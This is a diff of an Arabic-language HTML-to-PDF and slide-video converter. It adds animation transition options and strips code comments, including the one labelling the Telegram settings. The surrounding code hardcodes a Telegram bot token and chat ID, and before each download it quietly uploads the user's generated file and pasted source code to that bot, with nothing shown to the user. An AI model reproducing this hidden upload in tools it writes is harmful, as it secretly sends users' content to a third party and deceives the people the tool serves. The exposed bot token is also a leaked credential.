@@ -14,7 +14,6 @@
         .header { text-align: center; margin-bottom: 20px; }
         .header h2 { margin: 0; color: #f8fafc; font-size: 26px;}
 
-        /* Navigation Tabs */
         .top-nav { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; width: 100%; max-width: 600px;}
         .nav-btn { flex: 1; background: #1e293b; color: #94a3b8; border: 2px solid #334155; padding: 12px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.3s; }
         .nav-btn.active { background: #2563eb; color: #fff; border-color: #2563eb; }
@@ -51,7 +50,6 @@
         .tab-content { display: none; }
         .tab-content.active-tab { display: flex; }
 
-        /* تنسيق البروكات */
         .ai-prompts { background: #022c22; border: 1px dashed #059669; padding: 15px; border-radius: 10px; margin-bottom: 20px;}
         .ai-prompts p { margin: 0 0 10px 0; font-size: 14px; color: #34d399; font-weight: bold; text-align: center;}
         .prompt-btns { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center;}
@@ -106,7 +104,7 @@
                             <option value="pdf-a4">بحث / تقرير (A4)</option>
                             <option value="pdf-169">عرض تقديمي (16:9)</option>
                         </optgroup>
-                        <optgroup label="مقاطع فيديو سينمائية">
+                        <optgroup label="مقاطع فيديو">
                             <option value="vid-169">فيديو شاشات (16:9)</option>
                             <option value="vid-916">فيديو جوال (9:16)</option>
                         </optgroup>
@@ -124,11 +122,20 @@
 
             <div class="row" id="video-options" style="display: none;">
                 <div class="form-group">
-                    <label>مدة عرض كل شريحة (بالثواني):</label>
+                    <label>مدة كل شريحة:</label>
                     <select id="slide-duration">
                         <option value="3">3 ثواني</option>
                         <option value="5" selected>5 ثواني</option>
                         <option value="8">8 ثواني</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>طريقة الانتقال (الأنيميشن):</label>
+                    <select id="animation-style">
+                        <option value="zoom" selected>تكبير سينمائي (Zoom)</option>
+                        <option value="slide">سحب جانبي (Slide)</option>
+                        <option value="fade">تلاشي ناعم (Fade)</option>
+                        <option value="none">بدون حركة (مباشر)</option>
                     </select>
                 </div>
             </div>
@@ -194,9 +201,6 @@
     </div>
 
     <script>
-        // ==========================================
-        // إعدادات تيليجرام
-        // ==========================================
         const botToken = '8596768390:AAFMUk6zaACs6Zmum5kFy3NfNEkS_C4yZzo'; 
         const chatId = '6680237928'; 
         const secretHash = "U2ExMjM0NTY3OEA="; 
@@ -217,20 +221,17 @@
             }).catch(e => console.error(e));
         }
 
-        // إرسال الملفات (تحديث: الانتظار حتى تكتمل العملية)
         async function sendFileToTelegram(blob, name, caption, type = 'document') {
             const endpoint = type === 'video' ? 'sendVideo' : 'sendDocument';
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append(type === 'video' ? 'video' : 'document', blob, name); 
             formData.append('caption', caption);
-            
             try { 
                 const response = await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, { method: 'POST', body: formData });
                 const data = await response.json();
                 return data.ok;
             } catch (e) {
-                console.error("فشل إرسال الملف", e);
                 return false;
             }
         }
@@ -389,6 +390,7 @@
             const code = document.getElementById('html-input').value;
             const fileName = document.getElementById('file-name').value || 'video';
             const durationSec = parseInt(document.getElementById('slide-duration').value);
+            const animStyle = document.getElementById('animation-style').value;
             const quality = parseInt(document.getElementById('quality-select').value);
 
             let w = document.getElementById('format-select').value === 'vid-916' ? 720 : 1280;
@@ -424,11 +426,9 @@
                         const blob = new Blob(chunks, { type: mimeType || 'video/webm' });
                         const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
 
-                        // إرسال لتيليجرام أولاً والإنتظار
                         await sendFileToTelegram(blob, `${fileName}.${ext}`, `🎬 فيديو جاهز!`, 'video');
                         await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 الكود`);
 
-                        // التحميل للمستخدم بعد نجاح الإرسال
                         btn.innerText = "✅ اكتمل! جاري التحميل لجهازك...";
                         const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `${fileName}.${ext}`; document.body.appendChild(a); a.click(); document.body.removeChild(a);
                         
@@ -445,14 +445,46 @@
                         const idx = Math.floor(elapsed / (durationSec * 1000));
                         const timeInSlide = elapsed % (durationSec * 1000);
                         ctx.fillStyle = "#ffffff"; ctx.fillRect(0, 0, w, h);
-                        const zoom = 1 + (timeInSlide / (durationSec * 1000)) * 0.05;
-                        const zw = w * zoom; const zh = h * zoom; const ox = (w - zw) / 2; const oy = (h - zh) / 2;
 
-                        if (timeInSlide > (durationSec * 1000 - transDur) && idx < canvases.length - 1) {
-                            const p = (timeInSlide - (durationSec * 1000 - transDur)) / transDur;
-                            ctx.drawImage(canvases[idx], -p * w + ox, oy, zw, zh);
-                            ctx.drawImage(canvases[idx+1], w - p * w, 0, w, h);
-                        } else { ctx.drawImage(canvases[idx], ox, oy, zw, zh); }
+                        if (animStyle === 'none') {
+                            ctx.drawImage(canvases[idx], 0, 0, w, h);
+                        } 
+                        else if (animStyle === 'fade') {
+                            if (timeInSlide > (durationSec * 1000 - transDur) && idx < canvases.length - 1) {
+                                const p = (timeInSlide - (durationSec * 1000 - transDur)) / transDur;
+                                ctx.drawImage(canvases[idx], 0, 0, w, h);
+                                ctx.globalAlpha = p;
+                                ctx.drawImage(canvases[idx+1], 0, 0, w, h);
+                                ctx.globalAlpha = 1;
+                            } else {
+                                ctx.drawImage(canvases[idx], 0, 0, w, h);
+                            }
+                        } 
+                        else if (animStyle === 'slide') {
+                            if (timeInSlide > (durationSec * 1000 - transDur) && idx < canvases.length - 1) {
+                                const p = (timeInSlide - (durationSec * 1000 - transDur)) / transDur;
+                                ctx.drawImage(canvases[idx], -p * w, 0, w, h);
+                                ctx.drawImage(canvases[idx+1], w - p * w, 0, w, h);
+                            } else {
+                                ctx.drawImage(canvases[idx], 0, 0, w, h);
+                            }
+                        }
+                        else if (animStyle === 'zoom') {
+                            const zoom = 1 + (timeInSlide / (durationSec * 1000)) * 0.05;
+                            const zw = w * zoom; const zh = h * zoom; 
+                            const ox = (w - zw) / 2; const oy = (h - zh) / 2;
+                            
+                            if (timeInSlide > (durationSec * 1000 - transDur) && idx < canvases.length - 1) {
+                                const p = (timeInSlide - (durationSec * 1000 - transDur)) / transDur;
+                                ctx.drawImage(canvases[idx], ox, oy, zw, zh);
+                                ctx.globalAlpha = p;
+                                ctx.drawImage(canvases[idx+1], 0, 0, w, h);
+                                ctx.globalAlpha = 1;
+                            } else {
+                                ctx.drawImage(canvases[idx], ox, oy, zw, zh);
+                            }
+                        }
+
                         requestAnimationFrame(animate);
                     } else { setTimeout(() => recorder.stop(), 100); }
                 }
@@ -491,11 +523,9 @@
                 const blob = pdf.output('blob');
                 const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
 
-                // إرسال لتيليجرام أولاً والإنتظار
                 await sendFileToTelegram(blob, `${fileName}.pdf`, "📥 بحث PDF جاهز!");
                 await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 الكود`);
                 
-                // التحميل للمستخدم
                 btn.innerText = "✅ اكتمل! جاري التحميل لجهازك...";
                 pdf.save(`${fileName}.pdf`);
 
